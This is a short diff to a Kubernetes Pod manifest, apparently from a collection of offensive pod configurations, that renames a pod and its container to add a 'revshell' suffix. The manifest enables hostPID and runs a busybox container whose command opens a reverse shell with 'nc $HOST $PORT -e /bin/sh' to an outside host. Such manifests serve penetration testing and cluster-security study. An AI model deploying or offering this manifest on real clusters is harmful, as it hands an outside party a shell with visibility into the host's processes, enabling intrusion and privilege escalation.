@@ -6,13 +6,13 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-priv-and-hostpid
+  name: pod-priv-and-hostpid-revshell
   labels: 
-    app: priv-and-hostpid
+    app: priv-and-hostpid-revshell
 spec:
   hostPID: true
   containers:
-  - name: priv-and-hostpid
+  - name: priv-and-hostpid-revshell
     image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
